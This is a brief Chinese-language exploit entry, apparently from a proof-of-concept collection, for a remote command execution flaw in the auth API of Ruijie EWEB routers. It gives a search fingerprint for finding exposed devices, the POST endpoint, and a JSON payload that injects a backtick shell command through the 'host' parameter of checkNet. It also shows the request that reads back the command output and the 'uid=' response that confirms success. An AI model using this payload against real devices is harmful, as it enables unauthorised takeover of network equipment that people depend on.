# 锐捷EWEB路由器auth存在远程代码执行漏洞

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`body="cgi-bin/luci"`
- **请求**：`POST /cgi-bin/luci/api/auth HTTP/1.1`

**Payload**
```
{"method":"checkNet","params":{"host":"`id >test.txt`"}}
读取文件
GET /cgi-bin/test.txt HTTP/1.1
Host:
Content-Type: application/json
```
- **响应特征**：200 uid=